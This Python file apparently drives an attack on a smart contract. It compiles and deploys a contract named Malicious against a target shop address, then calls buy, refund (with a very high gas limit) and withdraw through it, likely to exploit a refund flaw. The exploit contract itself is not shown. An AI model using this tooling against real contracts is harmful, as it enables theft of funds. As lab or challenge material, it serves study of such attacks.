from web3 import Web3
from solcx import compile_source


class MaliciousContract():
    ABI: dict
    BYTECODE: str
    SOURCE_CODE: str

    private_key: str
    ownerAddress: str
    web3: dict
    Malicious = None
    contractAddress: str




    ###################################################
    #                                                 #
    #                     INIT                        #
    #                                                 #
    ###################################################
    def __init__(self, ownerAddress: str, private_key: str, rpc: str):
        self.ownerAddress = ownerAddress
        self.private_key = private_key
        self.web3 = Web3(Web3.HTTPProvider(rpc))
        
        # Read and compile the Malicious contract
        with open('./contract/Malicious.sol', 'r') as file:
            self.SOURCE_CODE = file.read()

        # Compile the contract to get ABI
        compiled_sol = compile_source(self.SOURCE_CODE, solc_version="0.6.0")
        contract_interface = compiled_sol['<stdin>:Malicious']
        # Get ABI and Bytecode
        self.ABI = contract_interface['abi']
        self.BYTECODE = contract_interface['bin']





    ###################################################
    #                                                 #
    #                    PUBLIC                       #
    #                                                 #
    ###################################################
    """
        Build and deploy the Malicious contract
    """
    def deploy(self, shop_address: str):
        nonce = self.web3.eth.get_transaction_count(self.ownerAddress)
        transaction = {
            'from': self.ownerAddress,
            'gas': 80000000,
            'gasPrice': self.web3.to_wei('20', 'gwei'),
            'nonce': nonce
        }

        contract = self.web3.eth.contract(abi=self.ABI, bytecode=self.BYTECODE)
        transaction['data'] = contract.constructor(shop_address).build_transaction(transaction)['data']

        signed_txn = self.web3.eth.account.sign_transaction(transaction, private_key=self.private_key)
        tx_hash = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction)
        print(f'Transaction valided successfully !!!')
        tx_receipt = self.web3.eth.wait_for_transaction_receipt(tx_hash)

        self.Malicious = self.web3.eth.contract(address=tx_receipt.contractAddress, abi=self.ABI)
        self.contractAddress = tx_receipt.contractAddress



    """
        Buy through the Malicious contract
    """
    def buy(self, item, quantity, value):
        try:
            if not self._is_deployed():
                raise Exception("Malicious not deployed yet")
            
            transaction = self.Malicious.functions.buy(item, quantity).build_transaction({
                'from': self.ownerAddress,
                'value': value,
                'nonce': self.web3.eth.get_transaction_count(self.ownerAddress)
            })

            signed_txn = self.web3.eth.account.sign_transaction(transaction, private_key=self.private_key)
            self.web3.eth.send_raw_transaction(signed_txn.rawTransaction)

            print(f'Transaction valided successfully !!!')
        except Exception as e:
            print(f'Error sending buy transaction: {e}')



    """
        Refund through the Malicious contract
    """
    def refund(self):
        try:
            if not self._is_deployed():
                raise Exception("Malicious not deployed yet")
            
            transaction = self.Malicious.functions.refund().build_transaction({
                "gas": 90000000,
                'from': self.ownerAddress,
                'nonce': self.web3.eth.get_transaction_count(self.ownerAddress)
            })

            signed_txn = self.web3.eth.account.sign_transaction(transaction, private_key=self.private_key)
            self.web3.eth.send_raw_transaction(signed_txn.rawTransaction)
            print(f'Transaction valided successfully !!!')
        except Exception as e:
            print(f'Error sending refund transaction: {e}')



    """
        Refund through the Malicious contract
    """
    def withdraw(self):
        try:
            if not self._is_deployed():
                raise Exception("Malicious not deployed yet")

            transaction = self.Malicious.functions.withdraw().build_transaction({
                'from': self.ownerAddress,
                'nonce': self.web3.eth.get_transaction_count(self.ownerAddress)
            })

            signed_txn = self.web3.eth.account.sign_transaction(transaction, private_key=self.private_key)
            self.web3.eth.send_raw_transaction(signed_txn.rawTransaction)
            print(f'Transaction valided successfully !!!')
        except Exception as e:
            print(f'Error sending refund transaction: {e}')
    




    ###################################################
    #                                                 #
    #                   INTERNAL                      #
    #                                                 #
    ###################################################

    def _is_deployed(self) -> bool:
        return self.Malicious != None